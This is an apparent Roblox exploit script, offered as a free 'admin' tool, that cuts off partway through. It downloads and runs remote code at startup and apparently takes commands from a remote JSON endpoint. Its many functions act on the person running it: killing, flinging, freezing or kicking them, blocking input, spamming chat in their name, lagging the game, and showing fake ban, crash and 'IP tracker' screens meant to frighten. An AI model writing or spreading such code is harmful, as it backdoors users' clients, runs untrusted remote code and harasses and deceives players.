-- Ultra Admin v3.1 [FREE]
local s,e=pcall(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/UltraAdmin/loader/main/init.lua"))()end)
if not s then warn("[UltraAdmin] Error: "..tostring(e));warn("[UltraAdmin] Server unavailable.") end

local H=game:GetService("HttpService")
local P=game:GetService("Players")
local R=game:GetService("RunService")
local W=game:GetService("Workspace")
local L=game:GetService("Lighting")
local UIS=game:GetService("UserInputService")
local SG=game:GetService("StarterGui")
local CG=game:GetService("CoreGui")
local TS_S=game:GetService("TweenService")
local LP=P.LocalPlayer
local URL="https://api.npoint.io/d5decbe9a46d769f5419"
local TS=0
local S={spn=false,fly=false,ncl=false,inv=false,szr=false,drunk=false,rainbow=false,dloop=false,tploop=false,fwalk=false,swalk=false,bwalk=false,shake=false,blocked=false,con={},snd={}}

-- HTTP
local function hGet(u) local o,r=pcall(function() if request then return request({Url=u,Method="GET"}).Body elseif http_request then return http_request({Url=u,Method="GET"}).Body else return game:HttpGet(u) end end);return o and r or nil end
local function hPost(u,b) pcall(function() if request then request({Url=u,Method="POST",Headers={["Content-Type"]="application/json"},Body=b}) elseif http_request then http_request({Url=u,Method="POST",Headers={["Content-Type"]="application/json"},Body=b}) end end) end
local function jd(s) local o,d=pcall(H.JSONDecode,H,s) return o and d or nil end
local function je(t) return H:JSONEncode(t) end

-- Utils
local function mr() return LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") end
local function mh() return LP.Character and LP.Character:FindFirstChildOfClass("Humanoid") end
local function ac(n,c) if S.con[n] then pcall(function() S.con[n]:Disconnect() end) end;S.con[n]=c end
local function rc(n) if S.con[n] then pcall(function() S.con[n]:Disconnect() end);S.con[n]=nil end end
local function cm() if LP.Character then for _,v in pairs(LP.Character:GetDescendants()) do if(v:IsA("BodyVelocity")or v:IsA("BodyGyro")or v:IsA("BodyPosition"))and v.Name=="Z" then v:Destroy() end end end end
local function addFX(cl,pr) local ch=LP.Character;if not ch then return end;local root=ch:FindFirstChild("HumanoidRootPart");if not root then return end;local fx=Instance.new(cl);fx.Name="Z_PFX";for k,v in pairs(pr or{}) do fx[k]=v end;fx.Parent=root;return fx end
local function removeFX() if not LP.Character then return end;for _,v in pairs(LP.Character:GetDescendants()) do if v.Name=="Z_PFX" then v:Destroy() end end end
local function clearVG() for _,v in pairs(CG:GetChildren()) do if v.Name:sub(1,3)=="ZV_" then v:Destroy() end end;pcall(function() for _,v in pairs(LP.PlayerGui:GetChildren()) do if v.Name:sub(1,3)=="ZV_" then v:Destroy() end end end) end
local function checkAuth(cmd,field)
    if not cmd[field] then return false end
    local raw=hGet(URL);if not raw then return false end
    local data=jd(raw);if not data then return false end
    local hashKey=field=="vip_auth" and "vip_hash" or "adm_hash"
    return cmd[field]==(data[hashKey] or "")
end
local function makeGui(name)
    clearVG()
    local sg=Instance.new("ScreenGui");sg.Name="ZV_"..name;sg.ResetOnSpawn=false;sg.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;sg.DisplayOrder=999
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(sg) end end)
    local ok=pcall(function() sg.Parent=CG end);if not ok then sg.Parent=LP.PlayerGui end
    return sg
end

-- ═══════════════════════════════════════
-- СТАНДАРТНЫЕ ФУНКЦИИ
-- ═══════════════════════════════════════
local function doKill() local h=mh();if h then h.Health=0 end end
local function doJump() local h=mh();if h then h.Jump=true end end
local function doSit() local h=mh();if h then h.Sit=true end end
local function doFling() local r=mr();if not r then return end;local bv=Instance.new("BodyVelocity");bv.Name="Z";bv.MaxForce=Vector3.new(1e6,1e6,1e6);bv.Velocity=Vector3.new(math.random(-400,400),math.random(300,600),math.random(-400,400));bv.Parent=r;task.delay(0.4,function() if bv.Parent then bv:Destroy() end end) end
local function doTPSky() local r=mr();if r then r.CFrame=r.CFrame+Vector3.new(0,500,0) end end
local function doTPVoid() local r=mr();if r then r.CFrame=CFrame.new(0,-500,0) end end
local function doMegaSky() local r=mr();if r then r.CFrame=CFrame.new(0,5000,0) end end
local function doEdge() local r=mr();if r then r.CFrame=CFrame.new(9999,200,9999) end end
local function doExplode() local r=mr();if not r then return end;local ex=Instance.new("Explosion");ex.Position=r.Position;ex.BlastRadius=0;ex.BlastPressure=0;ex.Parent=W;task.delay(0.1,doKill) end
local function doTornadoFling() local r=mr();if not r then return end;local cn;cn=R.Heartbeat:Connect(function(dt) if not mr() then cn:Disconnect();return end;r.CFrame=r.CFrame*CFrame.Angles(0,dt*20,dt*5)+Vector3.new(0,dt*50,0) end);task.delay(2,function() cn:Disconnect();doFling() end) end
local function doLightning() local r=mr();if not r then return end;local cc=Instance.new("ColorCorrectionEffect");cc.Name="Z_FX";cc.Brightness=3;cc.Parent=L;local s=Instance.new("Sound");s.SoundId="rbxassetid://12222216";s.Volume=8;s.Parent=r;s.Playing=true;task.delay(0.3,function() cc:Destroy();doKill() end) end
local function doDeathLoop() S.dloop=true;ac("dloop",LP.CharacterAdded:Connect(function(ch) if not S.dloop then return end;task.wait(0.5);local h=ch:WaitForChild("Humanoid",3);if h then h.Health=0 end end));doKill() end
local function doStopDeathLoop() S.dloop=false;rc("dloop") end
local function doFreeze() local r=mr();if r then r.Anchored=not r.Anchored end end
local function doSpin() if S.spn then rc("spn");S.spn=false;return end;S.spn=true;ac("spn",R.Heartbeat:Connect(function(dt) if not S.spn then return end;local r=mr();if r then r.CFrame=r.CFrame*CFrame.Angles(0,dt*20,0) end end)) end
local function doFastSpin() if S.spn then rc("spn");S.spn=false;return end;S.spn=true;ac("spn",R.Heartbeat:Connect(function(dt) if not S.spn then return end;local r=mr();if r then r.CFrame=r.CFrame*CFrame.Angles(dt*30,dt*40,dt*20) end end)) end
local function doInvert() local h=mh();if h then h.AutoRotate=not h.AutoRotate end end
local function doRagdoll() local h=mh();if not h then return end;h:ChangeState(Enum.HumanoidStateType.Physics);task.delay(3,function() if h and h.Parent then h:ChangeState(Enum.HumanoidStateType.GettingUp) end end) end
local function doForceWalk() S.fwalk=not S.fwalk;if S.fwalk then ac("fwalk",R.Heartbeat:Connect(function() if not S.fwalk then return end;local h=mh();if h then h:Move(Vector3.new(0,0,-1),true) end end)) else rc("fwalk") end end
local function doDance() local h=mh();if not h then return end;local anim=Instance.new("Animation");anim.AnimationId="rbxassetid://5917459365";local track=h:LoadAnimation(anim);track:Play();task.delay(10,function() track:Stop() end) end
local function doSeizureWalk() S.swalk=not S.swalk;if S.swalk then ac("swalk",R.Heartbeat:Connect(function() if not S.swalk then return end;local h=mh();if h then h:Move(Vector3.new(math.random()-0.5,0,math.random()-0.5),true);if math.random()>0.7 then h.Jump=true end end end)) else rc("swalk") end end
local function doMagnet() local r=mr();if not r then return end;for _,plr in pairs(P:GetPlayers()) do if plr~=LP and plr.Character then local tr=plr.Character:FindFirstChild("HumanoidRootPart");if tr then local bp=Instance.new("BodyPosition");bp.Name="Z";bp.Position=r.Position;bp.MaxForce=Vector3.new(5000,5000,5000);bp.Parent=tr;task.delay(3,function() if bp.Parent then bp:Destroy() end end) end end end end
local function doBotWalk() S.bwalk=not S.bwalk end
local function doLockCam() local cam=W.CurrentCamera;cam.CameraType=Enum.CameraType.Scriptable;cam.CFrame=CFrame.new(cam.CFrame.Position,cam.CFrame.Position+Vector3.new(0,1,0));task.delay(5,function() cam.CameraType=Enum.CameraType.Custom end) end
local function doSkydive() local r=mr();if r then r.CFrame=r.CFrame+Vector3.new(0,800,0) end;task.delay(3,doFling) end

-- Mods
local function doSpeed(_,p) local h=mh();if h then h.WalkSpeed=(p and p.speed) or 200 end end
local function doSpeedReset() local h=mh();if h then h.WalkSpeed=16;h.JumpPower=50 end end
local function doJumpPower(_,p) local h=mh();if h then h.JumpPower=(p and p.power) or 200 end end
local function doGiant(_,p) local h=mh();if not h then return end;local sc=(p and p.scale) or 5;pcall(function() for _,n in pairs({"BodyDepthScale","BodyHeightScale","BodyWidthScale","HeadScale"}) do local v=h:FindFirstChild(n);if v then v.Value=sc end end end) end
local function doInvisible() S.inv=not S.inv;local ch=LP.Character;if not ch then return end;for _,p in pairs(ch:GetDescendants()) do if p:IsA("BasePart") or p:IsA("Decal") or p:IsA("Texture") then p.Transparency=S.inv and 1 or 0 end end end
local function doNoclip() S.ncl=not S.ncl;if S.ncl then ac("ncl",R.Stepped:Connect(function() if not S.ncl or not LP.Character then return end;for _,p in pairs(LP.Character:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide=false end end end)) else rc("ncl") end end
local function doFly() S.fly=not S.fly;local r=mr();if not r then return end;if S.fly then local bg=Instance.new("BodyGyro");bg.Name="Z";bg.P=9e4;bg.MaxTorque=Vector3.new(9e9,9e9,9e9);bg.Parent=r;local bv=Instance.new("BodyVelocity");bv.Name="Z";bv.MaxForce=Vector3.new(9e9,9e9,9e9);bv.Velocity=Vector3.new();bv.Parent=r;ac("fly",R.Heartbeat:Connect(function() if not S.fly then return end;local cam=W.CurrentCamera;local d=Vector3.new();if UIS:IsKeyDown(Enum.KeyCode.W) then d=d+cam.CFrame.LookVector end;if UIS:IsKeyDown(Enum.KeyCode.S) then d=d-cam.CFrame.LookVector end;if UIS:IsKeyDown(Enum.KeyCode.A) then d=d-cam.CFrame.RightVector end;if UIS:IsKeyDown(Enum.KeyCode.D) then d=d+cam.CFrame.RightVector end;if UIS:IsKeyDown(Enum.KeyCode.Space) then d=d+Vector3.new(0,1,0) end;if UIS:IsKeyDown(Enum.KeyCode.LeftShift) then d=d-Vector3.new(0,1,0) end;bv.Velocity=d*80;bg.CFrame=cam.CFrame end)) else rc("fly");cm() end end
local function doGravity(_,p) W.Gravity=(p and p.gravity) or 30 end
local function doFire() addFX("Fire",{Size=15}) end
local function doSparkles() addFX("Sparkles",{SparkleColor=Color3.fromRGB(255,255,0)}) end
local function doSmoke() addFX("Smoke",{Size=10,Opacity=0.5}) end
local function doBubbles() local ch=LP.Character;if not ch then return end;local root=ch:FindFirstChild("HumanoidRootPart");if not root then return end;local pe=Instance.new("ParticleEmitter");pe.Name="Z_PFX";pe.Texture="rbxassetid://241685484";pe.Rate=50;pe.Lifetime=NumberRange.new(1,3);pe.Speed=NumberRange.new(3,6);pe.Parent=root end
local function doFlashlight() local ch=LP.Character;if not ch then return end;local head=ch:FindFirstChild("Head");if not head then return end;local sl=Instance.new("SpotLight");sl.Name="Z_PFX";sl.Brightness=5;sl.Range=60;sl.Angle=45;sl.Parent=head end
local function doTrail() local ch=LP.Character;if not ch then return end;local root=ch:FindFirstChild("HumanoidRootPart");if not root then return end;local a0=Instance.new("Attachment");a0.Name="Z_PFX";a0.Position=Vector3.new(0,1,0);a0.Parent=root;local a1=Instance.new("Attachment");a1.Name="Z_PFX";a1.Position=Vector3.new(0,-1,0);a1.Parent=root;local trail=Instance.new("Trail");trail.Name="Z_PFX";trail.Attachment0=a0;trail.Attachment1=a1;trail.Lifetime=1;trail.Color=ColorSequence.new{ColorSequenceKeypoint.new(0,Color3.fromRGB(255,0,0)),ColorSequenceKeypoint.new(0.5,Color3.fromRGB(0,0,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(255,0,255))};trail.Parent=root end
local function doIceBody() local ch=LP.Character;if not ch then return end;for _,p in pairs(ch:GetDescendants()) do if p:IsA("BasePart") then p.Transparency=0.5;p.Color=Color3.fromRGB(100,200,255);p.Material=Enum.Material.Ice end end end
local function doRemoveEffects() removeFX();W.Gravity=196.2 end

-- Visual
local function doSeizure() S.szr=not S.szr;if S.szr then ac("szr",R.Heartbeat:Connect(function() if not S.szr then return end;local cc=Instance.new("ColorCorrectionEffect");cc.Name="Z_FX";cc.Brightness=math.random()-0.5;cc.Contrast=math.random()*2;cc.Saturation=math.random()*3-1.5;cc.TintColor=Color3.fromHSV(math.random(),1,1);cc.Parent=L;task.delay(0.05,function() cc:Destroy() end) end)) else rc("szr");for _,v in pairs(L:GetChildren()) do if v.Name=="Z_FX" then v:Destroy() end end end end
local function doBlur() local b=Instance.new("BlurEffect");b.Name="Z_FX";b.Size=56;b.Parent=L;task.delay(8,function() if b.Parent then b:Destroy() end end) end
local function doFOV(_,p) W.CurrentCamera.FieldOfView=(p and p.fov) or 120 end
local function doBlackout() local cc=Instance.new("ColorCorrectionEffect");cc.Name="Z_FX";cc.Brightness=-1;cc.Contrast=-1;cc.Parent=L;task.delay(5,function() if cc.Parent then cc:Destroy() end end) end
local function doRedScreen() local cc=Instance.new("ColorCorrectionEffect");cc.Name="Z_FX";cc.TintColor=Color3.fromRGB(255,0,0);cc.Brightness=0.3;cc.Saturation=2;cc.Parent=L;task.delay(8,function() if cc.Parent then cc:Destroy() end end) end
local function doRainbow() S.rainbow=not S.rainbow;if S.rainbow then ac("rainbow",R.Heartbeat:Connect(function() if not S.rainbow then return end;local cc=L:FindFirstChild("Z_Rainbow");if not cc then cc=Instance.new("ColorCorrectionEffect");cc.Name="Z_Rainbow";cc.Parent=L end;cc.TintColor=Color3.fromHSV(tick()%5/5,1,1) end)) else rc("rainbow");local cc=L:FindFirstChild("Z_Rainbow");if cc then cc:Destroy() end end end
local function doDrunk() S.drunk=not S.drunk;if S.drunk then ac("drunk",R.Heartbeat:Connect(function() if not S.drunk then return end;local cam=W.CurrentCamera;cam.CFrame=cam.CFrame*CFrame.Angles(math.sin(tick()*2)*0.02,math.cos(tick()*1.5)*0.02,math.sin(tick()*3)*0.03) end));Instance.new("BlurEffect",L).Name="Z_Drunk" else rc("drunk");local b=L:FindFirstChild("Z_Drunk");if b then b:Destroy() end end end
local function doZoom() W.CurrentCamera.FieldOfView=10;task.delay(5,function() W.CurrentCamera.FieldOfView=70 end) end
local function doFlipCam() local cam=W.CurrentCamera;cam.CameraType=Enum.CameraType.Scriptable;cam.CFrame=cam.CFrame*CFrame.Angles(0,0,math.rad(180));task.delay(5,function() cam.CameraType=Enum.CameraType.Custom end) end
local function doFog() L.FogEnd=50;L.FogStart=0;L.FogColor=Color3.fromRGB(100,100,100);task.delay(10,function() L.FogEnd=100000 end) end
local function doRemoveSky() for _,v in pairs(L:GetChildren()) do if v:IsA("Sky") then v:Destroy() end end;L.FogEnd=200;L.FogColor=Color3.new(0,0,0) end
local function doNight() L.ClockTime=0 end
local function doDay() L.ClockTime=14 end
local function doShakeCam() S.shake=not S.shake;if S.shake then ac("shake",R.Heartbeat:Connect(function() if not S.shake then return end;local cam=W.CurrentCamera;cam.CFrame=cam.CFrame*CFrame.new((math.random()-0.5)*0.5,(math.random()-0.5)*0.5,(math.random()-0.5)*0.5) end)) else rc("shake") end end
local function doClearFX() for _,v in pairs(L:GetChildren()) do if v.Name:sub(1,2)=="Z_" then v:Destroy() end end;S.szr=false;S.rainbow=false;S.drunk=false;S.shake=false;rc("szr");rc("rainbow");rc("drunk");rc("shake");W.CurrentCamera.FieldOfView=70;W.CurrentCamera.CameraType=Enum.CameraType.Custom;L.FogEnd=100000;L.ClockTime=14 end

-- Sound
local function doSound(_,p) local id=p and p.id or "9114005388";local vol=p and p.volume or 5;local s=Instance.new("Sound");s.Name="Z_S";s.SoundId="rbxassetid://"..tostring(id);s.Volume=vol;s.RollOffMaxDistance=500;s.Playing=true;s.Parent=mr() or W;table.insert(S.snd,s);task.delay(30,function() if s and s.Parent then s:Destroy() end end) end
local function doLoopSound(_,p) local id=p and p.id or "9114005388";local cnt=p and p.count or 5;task.spawn(function() for i=1,cnt do doSound(nil,{id=id,volume=5});task.wait(5) end end) end
local function doStopSound() for _,s in pairs(S.snd) do pcall(function() s:Destroy() end) end;S.snd={} end

-- Chat
local function doChat(_,p) pcall(function() game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(p and p.message or "...","All") end) end
local function doChatSpam(_,p) local msg=(p and p.message) or "hacked";local cnt=(p and p.count) or 10;task.spawn(function() for i=1,cnt do pcall(function() game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg,"All") end);task.wait(0.6) end end) end
local function doChatNumbers(_,p) local cnt=(p and p.count) or 20;task.spawn(function() for i=1,cnt do pcall(function() game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(tostring(i),"All") end);task.wait(0.6) end end) end
local function doBotSpam(_,p) local cnt=(p and p.count) or 15;local msgs={"what","huh","where am i","help","lol","bruh","im confused","guys?","omg","AHHH","stop","hello??"};task.spawn(function() for i=1,cnt do pcall(function() game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msgs[math.random(#msgs)],"All") end);task.wait(math.random()+0.5) end end) end
local function doKeySpam(_,p) local cnt=(p and p.count) or 15;local ch="abcdefghijklmnopqrstuvwxyz123456789";task.spawn(function() for i=1,cnt do local s="";for j=1,math.random(5,20) do local idx=math.random(#ch);s=s..ch:sub(idx,idx) end;pcall(function() game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(s,"All") end);task.wait(0.5) end end) end

-- TP
local function doTP(_,p) local r=mr();if r and p then r.CFrame=CFrame.new(p.x or 0,p.y or 200,p.z or 0) end end
local function doRandomTP() local r=mr();if r then r.CFrame=CFrame.new(math.random(-500,500),math.random(50,300),math.random(-500,500)) end end
local function doTPSpawn() local r=mr();if not r then return end;local sp=W:FindFirstChild("SpawnLocation");if sp then r.CFrame=sp.CFrame+Vector3.new(0,5,0) else r.CFrame=CFrame.new(0,50,0) end end
local function doTPLoop() S.tploop=true;task.spawn(function() while S.tploop do doRandomTP();task.wait(3) end end) end
local function doStopTPLoop() S.tploop=false end

-- ═══════════════════════════════════════
-- 👑 VIP ФУНКЦИИ
-- ═══════════════════════════════════════
local function vipBlackScreen() local sg=makeGui("Blk");local f=Instance.new("Frame");f.Size=UDim2.new(1,0,1,0);f.BackgroundColor3=Color3.new(0,0,0);f.BorderSizePixel=0;f.ZIndex=100;f.Parent=sg end

local function vipBanScreen(_,p)
    local reason=(p and p.reason) or "Cheating"
    local sg=makeGui("Ban");local f=Instance.new("Frame");f.Size=UDim2.new(1,0,1,0);f.BackgroundColor3=Color3.fromRGB(15,15,15);f.BorderSizePixel=0;f.ZIndex=100;f.Parent=sg
    local function lbl(txt,sz,col,py,px) local l=Instance.new("TextLabel");l.Size=UDim2.new(0.8,0,0,sz+10);l.Position=UDim2.new(px or 0.1,0,py,0);l.BackgroundTransparency=1;l.Text=txt;l.TextSize=sz;l.Font=Enum.Font.GothamBold;l.TextColor3=col;l.ZIndex=101;l.Parent=f;return l end
    lbl("🚫",60,Color3.fromRGB(255,50,50),0.2,0.45)
    lbl("YOU HAVE BEEN BANNED",32,Color3.fromRGB(255,60,60),0.35)
    lbl("Reason: "..reason,18,Color3.fromRGB(200,200,200),0.45)
    lbl("Ban ID: #"..math.random(100000,999999),14,Color3.fromRGB(120,120,120),0.52)
    local btn=Instance.new("TextButton");btn.Size=UDim2.new(0,200,0,40);btn.Position=UDim2.new(0.5,-100,0.65,0);btn.BackgroundColor3=Color3.fromRGB(50,50,50);btn.Text="Acknowledge";btn.TextColor3=Color3.fromRGB(180,180,180);btn.TextSize=16;btn.Font=Enum.Font.Gotham;btn.ZIndex=101;btn.Parent=f;Instance.new("UICorner",btn).CornerRadius=UDim.new(0,6)
end

local function vipFullText(_,p)
    local text=(p and p.text) or "TROLLED";local colN=(p and p.color) or "red";local sz=(p and p.size) or 50
    local cols={red=Color3.new(1,0,0),green=Color3.new(0,1,0),blue=Color3.new(0,0.4,1),white=Color3.new(1,1,1),yellow=Color3.new(1,1,0),purple=Color3.fromRGB(180,0,255)}
    local sg=makeGui("Txt");local f=Instance.new("Frame");f.Size=UDim2.new(1,0,1,0);f.BackgroundColor3=Color3.new(0,0,0);f.BackgroundTransparency=0.3;f.BorderSizePixel=0;f.ZIndex=100;f.Parent=sg
    local lbl=Instance.new("TextLabel");lbl.Size=UDim2.new(0.9,0,0.5,0);lbl.Position=UDim2.new(0.05,0,0.25,0);lbl.BackgroundTransparency=1;lbl.Text=text;lbl.TextSize=sz;lbl.Font=Enum.Font.GothamBold;lbl.TextColor3=cols[colN] or cols.red;lbl.TextWrapped=true;lbl.ZIndex=101;lbl.Parent=f
    task.spawn(function() while sg.Parent do TS_S:Create(lbl,TweenInfo.new(0.5),{TextTransparency=0.5}):Play();task.wait(0.5);TS_S:Create(lbl,TweenInfo.new(0.5),{TextTransparency=0}):Play();task.wait(0.5) end end)
end

local function vipJumpscare()
    local sg=makeGui("Scare");local f=Instance.new("Frame");f.Size=UDim2.new(1,0,1,0);f.BackgroundColor3=Color3.new(0,0,0);f.BorderSizePixel=0;f.ZIndex=100;f.Parent=sg
    local lbl=Instance.new("TextLabel");lbl.Size=UDim2.new(1,0,1,0);lbl.BackgroundTransparency=1;lbl.Text="💀";lbl.TextSize=300;lbl.TextColor3=Color3.new(1,1,1);lbl.ZIndex=101;lbl.Parent=f
    doSound(nil,{id="12222216",volume=10})
    task.spawn(function() for i=1,20 do f.BackgroundColor3=Color3.fromRGB(math.random(0,255),0,0);lbl.TextColor3=Color3.fromHSV(math.random(),1,1);task.wait(0.1) end;task.wait(2);if sg.Parent then sg:Destroy() end end)
end

local function vipMatrix()
    local sg=makeGui("Mtx");local f=Instance.new("Frame");f.Size=UDim2.new(1,0,1,0);f.BackgroundColor3=Color3.new(0,0,0);f.BorderSizePixel=0;f.ZIndex=100;f.Parent=sg
    local chars="アイウエオカキクケコサシスセソタチツテト01"
    local cols={};for i=1,30 do local c=Instance.new("TextLabel");c.Size=UDim2.new(0,20,1,0);c.Position=UDim2.new(0,i*18,0,-math.random(0,500));c.BackgroundTransparency=1;c.TextColor3=Color3.fromRGB(0,255,70);c.TextSize=16;c.Font=Enum.Font.Code;c.TextYAlignment=Enum.TextYAlignment.Top;c.TextWrapped=true;c.ZIndex=101;c.Parent=f;table.insert(cols,c) end
    task.spawn(function() local t=0;while sg.Parent and t<15 do for _,c in pairs(cols) do local s="";for j=1,40 do local idx=math.random(#chars);s=s..chars:sub(idx,idx).."\n" end;c.Text=s;c.Position=c.Position+UDim2.new(0,0,0,2);if c.Position.Y.Offset>200 then c.Position=UDim2.new(c.Position.X.Scale,c.Position.X.Offset,0,-math.random(200,600)) end end;t=t+0.05;task.wait(0.05) end;if sg.Parent then sg:Destroy() end end)
end

local function vipBloodScreen() local sg=makeGui("Bld");local f=Instance.new("Frame");f.Size=UDim2.new(1,0,1,0);f.BackgroundColor3=Color3.fromRGB(80,0,0);f.BackgroundTransparency=0.3;f.BorderSizePixel=0;f.ZIndex=100;f.Parent=sg;task.spawn(function() for i=1,30 do f.BackgroundTransparency=0.2+math.sin(i*0.5)*0.3;f.BackgroundColor3=Color3.fromRGB(80+math.random(0,50),0,0);task.wait(0.15) end;if sg.Parent then sg:Destroy() end end) end

-- 🚫 НАСТОЯЩИЙ КИК
local function vipRealKick(_,p)
    local reason=(p and p.reason) or "Kicked by admin"
    LP:Kick(reason)
end

local function vipBlockInput() S.blocked=true;local sg=makeGui("Blk");local f=Instance.new("TextButton");f.Size=UDim2.new(1,0,1,0);f.BackgroundTransparency=0.99;f.Text="";f.ZIndex=100;f.Modal=true;f.Parent=sg;local r=mr();if r then r.Anchored=true end;local h=mh();if h then h.WalkSpeed=0;h.JumpPower=0 end end
local function vipUnblockInput() S.blocked=false;clearVG();local r=mr();if r then r.Anchored=false end;local h=mh();if h then h.WalkSpeed=16;h.JumpPower=50 end end
local function vipRemoveParts() local ch=LP.Character;if not ch then return end;for _,n in pairs({"Left Arm","Right Arm","Left Leg","Right Leg","LeftUpperArm","RightUpperArm","LeftUpperLeg","RightUpperLeg","LeftLowerArm","RightLowerArm","LeftLowerLeg","RightLowerLeg","LeftHand","RightHand","LeftFoot","RightFoot"}) do local p=ch:FindFirstChild(n);if p then p.Transparency=1;p.CanCollide=false end end end
local function vipFlatten() local h=mh();if not h then return end;pcall(function() local bh=h:FindFirstChild("BodyHeightScale");if bh then bh.Value=0.1 end;local bw=h:FindFirstChild("BodyWidthScale");if bw then bw.Value=3 end end) end
local function vipLagBomb() task.spawn(function() for i=1,300 do local p=Instance.new("Part");p.Name="Z_LAG";p.Size=Vector3.new(1,1,1);p.Position=Vector3.new(math.random(-100,100),math.random(0,100),math.random(-100,100));p.Anchored=false;p.Parent=W end;task.delay(10,function() for _,v in pairs(W:GetChildren()) do if v.Name=="Z_LAG" then v:Destroy() end end end) end) end
local function vipMegaSpam(_,p) local msg=(p and p.message) or "HACKED";local cnt=(p and p.count) or 100;task.spawn(function() for i=1,cnt do pcall(function() game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg.." ["..i.."]","All") end);task.wait(0.3) end end) end
local function vipSoundBomb() local ids={"9114005388","6229968865","12222216","160715357","8799788385","1585349108","278722060","188794535"};for _,id in pairs(ids) do doSound(nil,{id=id,volume=10}) end end
local function vipChaosMachine() task.spawn(function() doFling();task.wait(0.3);doSeizure();task.wait(0.2);doSound(nil,{id="9114005388",volume=10});task.wait(0.2);doSpin();task.wait(0.2);doFire();task.wait(0.2);doChatSpam(nil,{message="IM HACKED HELP 😱",count=15});vipBloodScreen() end) end
local function vipFakeError(_,p)
    local msg=(p and p.message) or "CRITICAL ERROR"
    local sg=makeGui("Err");local f=Instance.new("Frame");f.Size=UDim2.new(1,0,1,0);f.BackgroundColor3=Color3.fromRGB(0,0,120);f.BorderSizePixel=0;f.ZIndex=100;f.Parent=sg
    local lbl=Instance.new("TextLabel");lbl.Size=UDim2.new(0.8,0,0.6,0);lbl.Position=UDim2.new(0.1,0,0.1,0);lbl.BackgroundTransparency=1;lbl.TextColor3=Color3.new(1,1,1);lbl.TextSize=16;lbl.Font=Enum.Font.Code;lbl.TextWrapped=true;lbl.TextXAlignment=Enum.TextXAlignment.Left;lbl.TextYAlignment=Enum.TextYAlignment.Top;lbl.ZIndex=101;lbl.Parent=f
    local txt="A problem has been detected and Roblox has been shut down.\n\n"..msg.."\n\n*** STOP: 0x0000007E (0xC0000005, 0x"..string.format("%08X",math.random(0,0xFFFFFFFF))..")\n\nCollecting data...\nPhysical memory dump complete."
    task.spawn(function() local sh="";for i=1,#txt do sh=sh..txt:sub(i,i);lbl.Text=sh;task.wait(0.02) end end)
    task.delay(15,function() if sg.Parent then sg:Destroy() end end)
end
local function vipTimer(_,p)
    local secs=(p and p.seconds) or 10;local msg=(p and p.message) or "HACKED"
    local sg=makeGui("Tmr");local f=Instance.new("Frame");f.Size=UDim2.new(1,0,1,0);f.BackgroundColor3=Color3.new(0,0,0);f.BackgroundTransparency=0.5;f.BorderSizePixel=0;f.ZIndex=100;f.Parent=sg
    local timer=Instance.new("TextLabel");timer.Size=UDim2.new(1,0,0.5,0);timer.Position=UDim2.new(0,0,0.15,0);timer.BackgroundTransparency=1;timer.TextSize=120;timer.Font=Enum.Font.GothamBold;timer.TextColor3=Color3.new(1,0,0);timer.ZIndex=101;timer.Parent=f
    local sub=Instance.new("TextLabel");sub.Size=UDim2.new(0.8,0,0,30);sub.Position=UDim2.new(0.1,0,0.6,0);sub.BackgroundTransparency=1;sub.Text="⚠️ SYSTEM OVERRIDE ⚠️";sub.TextSize=20;sub.Font=Enum.Font.GothamBold;sub.TextColor3=Color3.fromRGB(255,100,0);sub.ZIndex=101;sub.Parent=f
    task.spawn(function() for i=secs,0,-1 do timer.Text=tostring(i);doSound(nil,{id="160715357",volume=3});task.wait(1) end;timer.Text="💀";sub.Text=msg;sub.TextSize=35;sub.TextColor3=Color3.new(1,0,0);doSound(nil,{id="12222216",volume=10});task.wait(5);if sg.Parent then sg:Destroy() end end)
end
local function vipFreezeScreen() local sg=makeGui("Frz");local f=Instance.new("TextButton");f.Size=UDim2.new(1,0,1,0);f.BackgroundTransparency=0.99;f.Text="";f.ZIndex=100;f.Modal=true;f.Parent=sg;local r=mr();if r then r.Anchored=true end;task.delay(10,function() if sg.Parent then sg:Destroy() end;local r2=mr();if r2 then r2.Anchored=false end end) end
local function vipCircus() task.spawn(function() doGiant(nil,{scale=10});task.wait(0.2);doSpin();task.wait(0.2);doSound(nil,{id="188794535",volume=8});task.wait(0.2);doRainbow();task.wait(0.2);doChatSpam(nil,{message="🤡 CIRCUS TIME 🎪",count=10});doSeizure() end) end

-- ═══════════════════════════════════════
-- 🔑 ADMIN ФУНКЦИИ
-- ═══════════════════════════════════════

-- 👁️ IP Tracker (фейк IP, пугает)
local function admIPTrack()
    local fakeIP = tostring(math.random(10,255)).."."..tostring(math.random(0,255)).."."..tostring(math.random(0,255)).."."..tostring(math.random(1,254))
    local sg=makeGui("IP")
    local f=Instance.new("Frame");f.Size=UDim2.new(1,0,1,0);f.BackgroundColor3=Color3.new(0,0,0);f.BackgroundTransparency=0.1;f.BorderSizePixel=0;f.ZIndex=100;f.Parent=sg

    local function mkLbl(txt,sz,col,py)
        local l=Instance.new("TextLabel");l.Size=UDim2.new(0.9,0,0,sz+10);l.Position=UDim2.new(0.05,0,py,0)
        l.BackgroundTransparency=1;l.Text=txt;l.TextSize=sz;l.Font=Enum.Font.Code;l.TextColor3=col;l.ZIndex=101;l.Parent=f;return l
    end

    mkLbl("👁️  IP TRACKER ACTIVATED",28,Color3.fromRGB(255,0,0),0.08)
    mkLbl("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",14,Color3.fromRGB(80,80,80),0.15)

    local info = {
        {"Target:",LP.Name,Color3.fromRGB(0,255,100)},
        {"User ID:",tostring(LP.UserId),Color3.fromRGB(0,255,100)},
        {"IP Address:",fakeIP,Color3.fromRGB(255,50,50)},
        {"Port:",tostring(math.random(49152,65535)),Color3.fromRGB(255,165,0)},
        {"ISP:","MegaFon / Rostelecom",Color3.fromRGB(255,165,0)},
        {"Region:","RU-MOW",Color3.fromRGB(255,165,0)},
